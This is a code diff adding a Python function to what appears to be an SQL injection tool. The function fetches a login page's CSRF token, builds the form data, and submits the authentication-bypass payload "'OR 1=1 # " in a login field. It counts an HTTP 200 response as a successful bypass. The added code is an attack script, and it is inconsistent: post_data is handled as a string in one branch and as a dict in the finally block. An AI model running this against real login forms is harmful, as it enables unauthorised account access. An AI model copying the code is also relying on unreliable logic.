@@ -26,6 +26,30 @@ def perform_request(url, sql_payload, method, post_data=None):
         raise ValueError("Invalid method specified.")
     return r
 
+def try_login(url, method, post_data):
+    sql_payload="'OR 1=1 # "
+    def get_csrf_token(url):
+        r = requests.get(url, verify=False)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        csrf = soup.find("input")['value']
+        return csrf
+    try:
+        csrf = get_csrf_token(url)
+        if csrf:
+            data = {"csrf": csrf}
+            data.update({key: value for key, value in (item.split('=') for item in post_data.split('&'))})
+            data[list(data.keys())[1]] = sql_payload
+            print(data)
+        res = perform_request(url,sql_payload, method, data)
+    
+    finally:
+        post_data[list(post_data.keys())[0]] = sql_payload
+        print(post_data)
+        res = perform_request(url, sql_payload,method, post_data)
+        if res.status_code == 200:
+            return True,sql_payload
+        else:
+            return False          
 
 
 def main():
